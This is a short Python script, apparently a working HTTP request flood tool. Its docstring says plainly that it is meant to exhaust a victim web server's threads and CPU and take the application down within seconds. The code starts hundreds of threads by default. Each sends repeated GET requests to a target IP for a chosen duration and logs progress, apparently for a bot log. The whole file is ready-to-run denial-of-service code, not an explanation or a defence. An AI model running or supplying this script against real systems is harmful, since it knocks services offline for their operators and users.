#!/usr/bin/env python3
"""
HTTP request flood — exhausts the target's application threads and CPU.
Unlike a SYN flood (which is absorbed by Linux SYN-cookies), this attack
completes full TCP handshakes and HTTP requests, forcing the victim's
Flask/web server to actually process each one. Against a victim with
tight resource limits (e.g. 128 MB / 5 % CPU) this brings the application
down within seconds.

Usage: python httpflood.py <target_ip> <duration_secs> [threads]
"""
import sys, time, threading, urllib.request

target   = sys.argv[1]
duration = int(sys.argv[2])
nthreads = int(sys.argv[3]) if len(sys.argv) > 3 else 250

counter = {"ok": 0, "err": 0}
lock = threading.Lock()


def worker():
    end = time.time() + duration
    while time.time() < end:
        try:
            urllib.request.urlopen(f"http://{target}/", timeout=4).read(64)
            with lock:
                counter["ok"] += 1
        except Exception:
            with lock:
                counter["err"] += 1


print(f"[httpflood] target=http://{target}/  threads={nthreads}  "
      f"duration={duration}s — beginning storm", flush=True)
start = time.time()
threads = []
for _ in range(nthreads):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    threads.append(t)

# Progress every 5 s so the bot log shows what is happening
elapsed = 0
while elapsed < duration:
    time.sleep(5)
    elapsed = int(time.time() - start)
    with lock:
        ok, err = counter["ok"], counter["err"]
    print(f"[httpflood] t={elapsed:02d}s  ok={ok}  err={err}", flush=True)

# Allow threads to wrap up
for t in threads:
    t.join(timeout=2)

with lock:
    ok, err = counter["ok"], counter["err"]
print(f"[httpflood] FINISHED — {ok} successful + {err} errored "
      f"requests in {duration}s ({(ok+err)/duration:.0f} rps)", flush=True)
